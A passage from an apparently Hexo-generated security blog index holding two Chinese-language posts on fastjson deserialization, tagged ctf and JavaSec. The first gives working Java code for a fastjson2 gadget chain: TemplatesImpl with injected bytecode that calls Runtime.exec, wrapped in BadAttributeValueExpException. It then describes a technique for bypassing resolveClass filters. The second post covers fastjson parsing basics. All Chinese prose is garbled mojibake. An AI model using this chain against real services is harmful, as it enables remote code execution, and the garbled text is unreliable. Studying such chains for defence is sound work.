class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><h2 id="fastjson2-å…¨ç‰ˆæœ¬"><a href="#fastjson2-å…¨ç‰ˆæœ¬" class="headerlink" title="fastjson2 å…¨ç‰ˆæœ¬"></a>fastjson2 å…¨ç‰ˆæœ¬</h2><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> javax.management.BadAttributeValueExpException;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.alibaba.fastjson2.JSONArray;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;</span><br><span class="line"><span class="keyword">import</span> javassist.ClassPool;</span><br><span class="line"><span class="keyword">import</span> javassist.CtClass;</span><br><span class="line"><span class="keyword">import</span> javassist.CtConstructor;</span><br><span class="line"><span class="keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Test</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">setValue</span><span class="params">(Object obj, String name, Object value)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> obj.getClass().getDeclaredField(name);</span><br><span class="line">        field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        field.set(obj, value);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        <span class="type">ClassPool</span> <span class="variable">pool</span> <span class="operator">=</span> ClassPool.getDefault();</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">clazz</span> <span class="operator">=</span> pool.makeClass(<span class="string">&quot;a&quot;</span>);</span><br><span class="line">        <span class="type">CtClass</span> <span class="variable">superClass</span> <span class="operator">=</span> pool.get(AbstractTranslet.class.getName());</span><br><span class="line">        clazz.setSuperclass(superClass);</span><br><span class="line">        <span class="type">CtConstructor</span> <span class="variable">constructor</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">CtConstructor</span>(<span class="keyword">new</span> <span class="title class_">CtClass</span>[]&#123;&#125;, clazz);</span><br><span class="line">        constructor.setBody(<span class="string">&quot;Runtime.getRuntime().exec(\&quot;open -na Calculator\&quot;);&quot;</span>);</span><br><span class="line">        clazz.addConstructor(constructor);</span><br><span class="line">        <span class="type">byte</span>[][] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;</span><br><span class="line">        <span class="type">TemplatesImpl</span> <span class="variable">templates</span> <span class="operator">=</span> TemplatesImpl.class.newInstance();</span><br><span class="line">        setValue(templates, <span class="string">&quot;_bytecodes&quot;</span>, bytes);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_name&quot;</span>, <span class="string">&quot;y4tacker&quot;</span>);</span><br><span class="line">        setValue(templates, <span class="string">&quot;_tfactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="type">JSONArray</span> <span class="variable">jsonArray</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">JSONArray</span>();</span><br><span class="line">        jsonArray.add(templates);</span><br><span class="line"></span><br><span class="line">        <span class="type">BadAttributeValueExpException</span> <span class="variable">val</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">BadAttributeValueExpException</span>(<span class="literal">null</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">valfield</span> <span class="operator">=</span> val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        valfield.set(val, jsonArray);</span><br><span class="line">        <span class="type">ByteArrayOutputStream</span> <span class="variable">barr</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">        <span class="type">ObjectOutputStream</span> <span class="variable">objectOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectOutputStream</span>(barr);</span><br><span class="line">        objectOutputStream.writeObject(val);</span><br><span class="line"></span><br><span class="line">        <span class="type">ObjectInputStream</span> <span class="variable">ois</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ObjectInputStream</span>(<span class="keyword">new</span> <span class="title class_">ByteArrayInputStream</span>(barr.toByteArray()));</span><br><span class="line">        <span class="type">Object</span> <span class="variable">o</span> <span class="operator">=</span> (Object)ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h2 id="ç»•è¿‡resolveClass"><a href="#ç»•è¿‡resolveClass" class="headerlink" title="ç»•è¿‡resolveClass"></a>ç»•è¿‡resolveClass</h2><h3 id="æŸ¥çœ‹ä¸ä¼šè°ƒç”¨çš„æƒ…å†µ"><a href="#æŸ¥çœ‹ä¸ä¼šè°ƒç”¨çš„æƒ…å†µ" class="headerlink" title="æŸ¥çœ‹ä¸ä¼šè°ƒç”¨çš„æƒ…å†µ"></a>æŸ¥çœ‹ä¸ä¼šè°ƒç”¨çš„æƒ…å†µ</h3><p>è·Ÿè¿›<code>java.io.ObjectInputStream#readObject0</code>,ä¼šæ ¹æ®è¯»åˆ°çš„bytesä¸­tcçš„æ•°æ®ç±»å‹åšä¸åŒçš„å¤„ç†å»æ¢å¤éƒ¨åˆ†å¯¹è±¡</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">switch</span> (tc) &#123;</span><br><span class="line">                <span class="keyword">case</span> TC_NULL:</span><br><span class="line">                    <span class="keyword">return</span> readNull();</span><br><span class="line">                <span class="keyword">case</span> TC_REFERENCE:</span><br><span class="line">                    <span class="keyword">return</span> readHandle(unshared);</span><br><span class="line">                <span class="keyword">case</span> TC_CLASS:</span><br><span class="line">                    <span class="keyword">return</span> readClass(unshared);</span><br><span class="line">                <span class="keyword">case</span> TC_CLASSDESC:</span><br><span class="line">                <span class="keyword">case</span> TC_PROXYCLASSDESC:</span><br><span class="line">                    <span class="keyword">return</span> readClassDesc(unshared);</span><br><span class="line">                <span class="keyword">case</span> TC_STRING:</span><br><span class="line">                <span class="keyword">case</span> TC_LONGSTRING:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readString(unshared));</span><br><span class="line">                <span class="keyword">case</span> TC_ARRAY:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readArray(unshared));</span><br><span class="line">                <span class="keyword">case</span> TC_ENUM:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readEnum(unshared));</span><br><span class="line">                <span class="keyword">case</span> TC_OBJECT:</span><br><span class="line">                    <span class="keyword">return</span> checkResolve(readOrdinaryObject(unshared));</span><br><span class="line">                <span class="keyword">case</span> TC_EXCEPTION:</span><br><span class="line">                    <span class="type">IOException</span> <span class="variable">ex</span> <span class="operator">=</span> readFatalException();</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">WriteAbortedException</span>(<span class="string">&quot;writing aborted&quot;</span>, ex);</span><br><span class="line">                <span class="keyword">case</span> TC_BLOCKDATA:</span><br><span class="line">                <span class="keyword">case</span> TC_BLOCKDATALONG:</span><br><span class="line">                    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                        bin.setBlockDataMode(<span class="literal">true</span>);</span><br><span class="line">                        bin.peek();             <span class="comment">// force header read</span></span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(</span><br><span class="line">                            bin.currentBlockRemaining());</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                            <span class="string">&quot;unexpected block data&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">case</span> TC_ENDBLOCKDATA:</span><br><span class="line">                    <span class="keyword">if</span> (oldMode) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">OptionalDataException</span>(<span class="literal">true</span>);</span><br><span class="line">                    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                            <span class="string">&quot;unexpected end of block data&quot;</span>);</span><br><span class="line">                    &#125;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StreamCorruptedException</span>(</span><br><span class="line">                        String.format(<span class="string">&quot;invalid type code: %02X&quot;</span>, tc));</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></div><p>ä¸Šé¢çš„ä¸åŒcaseä¸­å¤§éƒ¨åˆ†ç±»éƒ½ä¼šæœ€ç»ˆè°ƒç”¨<code>readClassDesc</code>å»è·å–ç±»çš„æè¿°ç¬¦ï¼Œåœ¨è¿™ä¸ªè¿‡ç¨‹ä¸­å¦‚æœå½“å‰ååºåˆ—åŒ–æ•°æ®ä¸‹ä¸€ä½ä»ç„¶æ˜¯<code>TC_CLASSDESC</code>é‚£ä¹ˆå°±ä¼šåœ¨<code>readNonProxyDesc</code>ä¸­è§¦å‘<code>resolveClass</code></p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032239877.png"                      alt="image-20230511210810954"                ><figcaption>image-20230511210810954</figcaption></figure></p><p>ä¸Šé¢è¿™ä¸ªswitchåˆ†æ”¯çš„ä»£ç ï¼Œä¸ä¼šè°ƒç”¨<code>readClassDesc</code>çš„åˆ†æ”¯æœ‰<code>TC_NULL</code>ã€<code>TC_REFERENCE</code>ã€<code>TC_STRING</code>ã€<code>TC_LONGSTRING</code>ã€<code>TC_EXCEPTION</code></p><p>æ‰€ä»¥æ€è·¯æ˜¯æ”¾ä¸¤ä¸ªç±»è¿›å»ï¼Œå¹¶ä¸”ç¬¬äºŒä¸ªç±»å¿…é¡»æ˜¯<code>TC_NULL</code>ã€<code>TC_REFERENCE</code>ã€<code>TC_STRING</code>ã€<code>TC_LONGSTRING</code>ã€<code>TC_EXCEPTION</code>ä¸­çš„ä¸€ä¸ªï¼Œè¿™é‡Œåˆ©ç”¨å¼•ç”¨ç±»å‹ï¼ˆå› ä¸ºå…¶ä»–ç±»å‹è¦ä¹ˆæ¯«æ— ç”¨å¤„ï¼Œè¦ä¹ˆç”¨äºè§£å†³åºåˆ—åŒ–ç»ˆæ­¢ç›¸å…³ï¼‰</p><h3 id="å¼•ç”¨ç±»å‹çš„åˆ©ç”¨"><a href="#å¼•ç”¨ç±»å‹çš„åˆ©ç”¨" class="headerlink" title="å¼•ç”¨ç±»å‹çš„åˆ©ç”¨"></a>å¼•ç”¨ç±»å‹çš„åˆ©ç”¨</h3><p>å½“å‘Listã€setã€mapç±»å‹ä¸­æ·»åŠ åŒæ ·å¯¹è±¡æ—¶å³å¯æˆåŠŸåˆ©ç”¨ï¼Œè¿™é‡Œä¹Ÿç®€å•æä¸€ä¸‹ï¼Œè¿™é‡Œä»¥Listä¸ºä¾‹ï¼Œ</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ArrayList&lt;Object&gt; arrayList = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">arrayList.add(templates);</span><br><span class="line">arrayList.add(templates);</span><br><span class="line">writeObjects(arrayList);</span><br></pre></td></tr></table></figure></div><p>å½“æˆ‘ä»¬å†™å…¥åŒæ ·çš„å¯¹è±¡æ—¶ï¼Œç¬¬äºŒä¸ªä¼šå˜æˆå¼•ç”¨ç±»å‹</p><p><figure class="image-caption"><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/202407032239655.png"                      alt="image-20230511211004050"                ><figcaption>image-20230511211004050</figcaption></figure></p>]]></content>
      
      
      <categories>
          
          <category> ctf </category>
          
          <category> JavaSec </category>
          
      </categories>
      
      
        <tags>
            
            <tag> fastjson </tag>
            
            <tag> java </tag>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>fastjsonå­¦ä¹ </title>
      <link href="/2023/02/01/fastjson%E5%AD%A6%E4%B9%A0/"/>
      <url>/2023/02/01/fastjson%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="fastjsonå­¦ä¹ "><a href="#fastjsonå­¦ä¹ " class="headerlink" title="fastjsonå­¦ä¹ "></a>fastjsonå­¦ä¹ </h1><p>fastjsonç»„ä»¶å¯ä»¥ç±»å¯¹è±¡åºåˆ—åŒ–æˆjsonå­—ç¬¦ä¸²ï¼Œå†é€šè¿‡JSON.parseã€JSON.parseObjectç­‰æ–¹æ³•ååºåˆ—åŒ–æˆç±»å¯¹è±¡</p><h2 id="åºåˆ—åŒ–å’Œååºåˆ—åŒ–"><a href="#åºåˆ—åŒ–å’Œååºåˆ—åŒ–" class="headerlink" title="åºåˆ—åŒ–å’Œååºåˆ—åŒ–"></a>åºåˆ—åŒ–å’Œååºåˆ—åŒ–</h2><h3 id="å¸¸è§ç±»å‹"><a href="#å¸¸è§ç±»å‹" class="headerlink" title="å¸¸è§ç±»å‹"></a>å¸¸è§ç±»å‹</h3><ul><li>JSONObject</li><li>JSONArray</li></ul><h3 id="ç®€å•ä½¿ç”¨"><a href="#ç®€å•ä½¿ç”¨" class="headerlink" title="ç®€å•ä½¿ç”¨"></a>ç®€å•ä½¿ç”¨</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">User</span> <span class="variable">user</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">User</span>(<span class="string">&quot;zhangsan&quot;</span>,<span class="number">12</span>);</span><br><span class="line"><span class="comment">//åºåˆ—åŒ–</span></span><br><span class="line"><span class="type">String</span> <span class="variable">serializedStr</span> <span class="operator">=</span> JSON.toJSONString(user); </span><br><span class="line">System.out.println(serializedStr);</span><br><span class="line"><span class="comment">//é€šè¿‡parseæ–¹æ³•è¿›è¡Œååºåˆ—åŒ–ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªJSONObject</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj1</span> <span class="operator">=</span> JSON.parse(serializedStr); </span><br><span class="line">System.out.println(<span class="string">&quot;parseååºåˆ—åŒ–å¯¹è±¡åç§°:&quot;</span>+obj1.getClass().getName()); System.out.println(<span class="string">&quot;parseååºåˆ—åŒ–:&quot;</span>+obj1);</span><br><span class="line"><span class="comment">//é€šè¿‡parseObject,ä¸æŒ‡å®šç±»ï¼Œè¿”å›çš„æ˜¯ä¸€ä¸ªJSONObject</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj2</span> <span class="operator">=</span> JSON.parseObject(serializedStr); </span><br><span class="line">System.out.println(<span class="string">&quot;parseObjectååºåˆ—åŒ–å¯¹è±¡åç§°:&quot;</span>+obj2.getClass().getName()); System.out.println(<span class="string">&quot;parseObjectååºåˆ—åŒ–:&quot;</span>+obj2);</span><br><span class="line"><span class="comment">//é€šè¿‡parseObject,æŒ‡å®šç±»åè¿”å›çš„æ˜¯ä¸€ä¸ªç›¸åº”çš„ç±»å¯¹è±¡</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj3</span> <span class="operator">=</span> JSON.parseObject(serializedStr,User.class); </span><br><span class="line">System.out.println(<span class="string">&quot;parseObjectååºåˆ—åŒ–å¯¹è±¡åç§°:&quot;</span>+obj3.getClass().getName()); System.out.println(<span class="string">&quot;parseObjectååºåˆ—åŒ–:&quot;</span>+obj3);</span><br><span class="line"></span><br><span class="line"><span class="comment">//@type</span></span><br><span class="line"><span class="type">String</span> <span class="variable">serializedStr</span> <span class="operator">=</span> JSON.toJSONString(user);</span><br><span class="line">System.out.println(serializedStr);</span><br><span class="line"><span class="type">String</span> <span class="variable">serializedStr1</span> <span class="operator">=</span> JSON.toJSONString(user, SerializerFeature.WriteClassName); System.out.println(serializedStr1);</span><br><span class="line">System.out.println(JSON.parse(serializedStr).getClass().toString());</span><br><span class="line">System.out.println(JSON.parse(serializedStr1).getClass().toString());</span><br><span class="line"></span><br><span class="line"><span class="comment">//è¾“å‡º</span></span><br><span class="line">æœ‰å‚æ„é€ </span><br><span class="line">getId</span><br><span class="line">getName&#123;<span class="string">&quot;id&quot;</span>:<span class="number">12</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>&#125;</span><br><span class="line">parseååºåˆ—åŒ–å¯¹è±¡åç§°:com.alibaba.fastjson.JSONObject</span><br><span class="line">parseååºåˆ—åŒ–:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="number">12</span>&#125;</span><br><span class="line">parseObjectååºåˆ—åŒ–å¯¹è±¡åç§°:com.alibaba.fastjson.JSONObject</span><br><span class="line">parseObjectååºåˆ—åŒ–:&#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="number">12</span>&#125;</span><br><span class="line">æ— å‚æ„é€ </span><br><span class="line">setId</span><br><span class="line">setName</span><br><span class="line">parseObjectååºåˆ—åŒ–å¯¹è±¡åç§°:com.example.fastjson.User</span><br><span class="line">parseObjectååºåˆ—åŒ–:User&#123;name=<span class="string">&#x27;zhangsan&#x27;</span>, id=<span class="number">12</span>&#125;</span><br><span class="line"><span class="comment">//@type</span></span><br><span class="line">getId</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;id&quot;</span>:<span class="number">12</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>&#125;</span><br><span class="line">getId</span><br><span class="line">getName</span><br><span class="line">&#123;<span class="string">&quot;@type&quot;</span>:<span class="string">&quot;com.example.fastjson.User&quot;</span>,<span class="string">&quot;id&quot;</span>:<span class="number">12</span>,<span class="string">&quot;name&quot;</span>:<span class="string">&quot;zhangsan&quot;</span>&#125;</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">com</span>.alibaba.fastjson.JSONObject</span><br><span class="line">æ— å‚æ„é€ </span><br><span class="line">setId</span><br><span class="line">setName</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">com</span>.example.fastjson.User</span><br></pre></td></tr></table></figure></div><blockquote><p>æ€»ç»“ï¼š</p><ul><li>è¦æƒ³ååºåˆ—åŒ–åå¾—åˆ°å¯¹åº”ç±»å‹çš„ç±»ï¼Œéœ€è¦ä½¿ç”¨parseObjectå¹¶ä¼ å…¥ç±»çš„.class<ul><li>åŒæ—¶è¿™æ ·ç”Ÿæˆçš„åºåˆ—åŒ–jsonå­—ç¬¦ä¸²ä¸­ä¼šå¸¦æœ‰@typeå±æ€§ï¼Œå­˜å‚¨ç€å¯¹åº”çš„ç±»å®Œæ•´åŒ…è·¯å¾„</li></ul></li><li>parseObject(â€œâ€,class) ä¼šè¯†åˆ«å¹¶è°ƒç”¨ç›®æ ‡ç±»çš„ç‰¹å®š setter æ–¹æ³•åŠæŸäº›ç‰¹å®šæ¡ä»¶çš„ getter æ–¹æ³•</li><li>è°ƒç”¨toJSONStringé•œåƒåºåˆ—åŒ–çš„æ—¶å€™ï¼Œä¼šè°ƒç”¨getter</li><li>ä¸æŒ‡å®š@typeä¸ä¼šè°ƒç”¨<strong>æ„é€ æ–¹æ³•</strong>å’Œ<strong>setter</strong></li><li>æŒ‡å®š@typeæ—¶ï¼Œparseåªä¼šè°ƒç”¨<strong>æ„é€ æ–¹æ³•</strong>å’Œç‰¹å®šsetterï¼Œè€ŒparseObjectä¼šé¢å¤–è°ƒç”¨getter</li></ul></blockquote><h3 id="public-x2F-privateå±æ€§åŒºåˆ«"><a href="#public-x2F-privateå±æ€§åŒºåˆ«" class="headerlink" title="public&#x2F;privateå±æ€§åŒºåˆ«"></a>public&#x2F;privateå±æ€§åŒºåˆ«</h3><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Person</span> &#123;</span><br><span class="line">    <span class="comment">//å±æ€§</span></span><br><span class="line">    <span class="keyword">public</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String full_name;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line">    <span class="keyword">private</span> Boolean sex;</span><br><span class="line">    <span class="keyword">private</span> Properties prop; <span class="comment">//æ„é€ å‡½æ•°</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">Person</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;Personæ„é€ å‡½æ•°&quot;</span>); &#125;</span><br><span class="line">    <span class="comment">//set</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;setAge()&quot;</span>);</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//get è¿”å›Boolean</span></span><br><span class="line">    <span class="keyword">public</span> Boolean <span class="title function_">getSex</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getSex()&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//get è¿”å›ProPerties</span></span><br><span class="line">    <span class="keyword">public</span> Properties <span class="title function_">getProp</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;getProp()&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.prop;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//åœ¨è¾“å‡ºæ—¶ä¼šè‡ªåŠ¨è°ƒç”¨çš„å¯¹è±¡ToStringå‡½æ•° </span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">toString</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">s</span> <span class="operator">=</span> <span class="string">&quot;[Person Object] name=&quot;</span> + <span class="built_in">this</span>.name + <span class="string">&quot; full_name=&quot;</span> +</span><br><span class="line">            <span class="built_in">this</span>.full_name  + <span class="string">&quot;, age=&quot;</span> + <span class="built_in">this</span>.age + <span class="string">&quot;, prop=&quot;</span> + <span class="built_in">this</span>.prop + <span class="string">&quot;, sex=&quot;</span> +</span><br><span class="line">            <span class="built_in">this</span>.sex;</span><br><span class="line">        <span class="keyword">return</span> s; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><p>æµ‹è¯•åºåˆ—åŒ–ä¸ååºåˆ—åŒ–</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">String</span> <span class="variable">eneity3</span> <span class="operator">=</span> <span class="string">&quot;&#123;\&quot;@type\&quot;:\&quot;com.example.fastjson.Person\&quot;,\&quot;name\&quot;:\&quot;zhang\&quot;, \&quot;full_name\&quot;:\&quot;zhangsan\&quot;, \&quot;age\&quot;: 18, \&quot;prop\&quot;: &#123;\&quot;123\&quot;:123&#125;, \&quot;sex\&quot;: 1&#125;&quot;</span>;</span><br><span class="line"><span class="comment">//ååºåˆ—åŒ–</span></span><br><span class="line"><span class="type">Object</span> <span class="variable">obj</span> <span class="operator">=</span> JSON.parseObject(eneity3,Person.class); <span class="comment">//è¾“å‡ºä¼šè°ƒç”¨objå¯¹è±¡çš„toStringå‡½æ•°</span></span><br><span class="line">System.out.println(obj);    </span><br></pre></td></tr></table></figure></div><p>è¾“å‡ºç»“æœ</p><div class="highlight-container" data-rel="Java"><figure class="iseeu highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Personæ„é€ å‡½æ•°</span><br><span class="line">setAge()</span><br><span class="line">getProp()</span><br><span class="line">[Person Object] name=zhang full_name=<span class="literal">null</span>, age=<span class="number">18</span>, prop=<span class="literal">null</span>, sex=<span class="literal">null</span></span><br></pre></td></tr></table></figure></div><blockquote><p>ä»ç»“æœæ¥çœ‹ï¼ŒæˆåŠŸé€šè¿‡ååºåˆ—åŒ–èµ‹å€¼çš„å±æ€§åªæœ‰nameå’Œageï¼Œè€Œå…¶ä¸­nameå› ä¸ºæ˜¯publicå› 